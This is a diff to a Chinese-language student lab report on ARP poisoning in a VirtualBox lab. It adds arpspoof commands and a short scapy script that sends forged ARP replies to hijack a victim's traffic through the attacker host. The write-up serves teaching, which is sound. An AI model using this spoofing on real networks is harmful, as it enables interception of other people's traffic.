@@ -9,6 +9,8 @@
 - VirtualBox 6.1 虚拟机
 
     ![虚拟机](./img/vb.png)
+- Python 2.7.18 
+- scapy 2.4.4
 - 网关（Gateway）：`Debian Buster`
 - 攻击者主机（Attacker）：`Kali Rolling 2109.2`
 - 靶机（Victim）：`Kali Rolling 2109.2`
@@ -171,7 +173,48 @@
 
     ![恢复成功](./img/arp恢复.png)
 ### 实验三（可选）：使用自动化工具完成 `ARP` 投毒劫持实验
+1. 在攻击者主机下载使用`arpspoof`自动化工具
+    ```bash
+    ┌──(kali㉿kali)-[~]
+    └─$ sudo apt-get install dsniff ssldump
+
+    ┌──(kali㉿kali)-[~]
+    └─$ sudo arpspoof                                                  
+    #Version: 2.4
+    #Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
+                                                                  
+    ┌──(kali㉿kali)-[~]
+    └─$ sudo arpspoof -i eth0 -t 172.16.111.126 172.16.111.1  
+    ```
+2. 在受害者主机查看`arp`缓存，实验成功
+
+    ![自动化工具成功](./img/arpspoof.png)
 ### 实验四（可选）：基于 `scapy` 编写 `ARP` 投毒劫持工具
+1. `python`编写基于`scapy`的代码[arp.py](./arp.py)
+    ```python
+    import scapy
+    def get_mac(IP):
+    	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
+    	ans, unans = srp(pkt, timeout=2, inter=0.1)
+    	for snd, rcv in ans:
+    		return rcv.sprintf("%Ether.src%")
+
+    def trick(gm,vm):
+    	send(ARP(op="is-at", pdst=vm, psrc=gm, hwdst=get_mac(vm)))
+    	send(ARP(op="is-at", pdst=gm, psrc=vm, hwdst=get_mac(gm)))
+	
+    if __name__ == "__main__":
+	    gm="172.16.111.1"
+	    vm="172.16.111.126"
+	    trick(gm,vm)
+    ```
+2. `scapy`运行代码
+
+    ![代码成功](./img/arp-trick.png)
+
+3. `scapy`另一种方式运行代码`sudo python3 arp.py`
+
+    ![代码成功](./img/py.png)
 ## 问题及解决
 1. `scapy`执行命令`pkt = promiscping("172.16.111.112")`时报错
 原因：报错为`permission denied`说明是权限不足
@@ -182,6 +225,12 @@
 3. `arpspoofed=ARP(xxx)`伪造网关的`ARP`响应包时不成功，受害者`ARP`没有改变
 原因：没有用以太网封装
 解决：命令改为`rpspoofed=Ether()/ARP(op=2, psrc="172.16.111.1", pdst="172.16.111.126", hwdst="08:00:27:24:e9:f9")`
+4. 实验三时虚拟机无法联网，`apt-get update`等命令报错
+原因：只开了攻击者和受害者主机，没有打开网关
+解决：三个主机同时开启
+5. 报错`arpspoof: libnet_open_link(): UID/EUID 0 or cap`
+原因：权限不足
+结局：语句前加`sudo`
 ## 参考资料
 
 [1] [18信安前辈的实验报告](https://github.com/CUCCS/2020-ns-public-kate123wong/tree/chap0x04/chap0x04)
@@ -191,3 +240,9 @@
 [3] [混杂模式介绍_实践求真知-CSDN博客_混杂模式](https://blog.csdn.net/chengqiuming/article/details/89603272)
 
 [4] [Scapy常用操作和命令(1)_Han的小站-CSDN博客](https://blog.csdn.net/qwertyupoiuytr/article/details/54670641)
+
+[5] [解决 arpspoof: libnet_open_link(): UID/EUID 0 or cap](https://blog.csdn.net/qq_34626094/article/details/113117218)
+
+[6] [scapy实现arp 毒化攻击](https://blog.csdn.net/ivnetware/article/details/51288532)
+
+[7] [用python编写的定向arp欺骗工具](https://www.cnblogs.com/darkpig/p/5866077.html)
